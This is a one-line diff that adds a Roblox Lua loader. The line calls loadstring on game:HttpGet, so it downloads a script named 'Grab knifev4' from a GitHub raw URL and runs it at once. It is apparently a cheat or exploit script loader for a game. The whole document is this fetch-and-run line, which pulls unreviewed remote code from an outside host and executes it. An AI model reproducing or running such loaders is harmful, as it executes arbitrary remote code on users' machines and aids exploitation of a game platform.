@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sinsonaran/grab-knife-v4/refs/heads/main/Grab%20knifev4%20lua",true))()
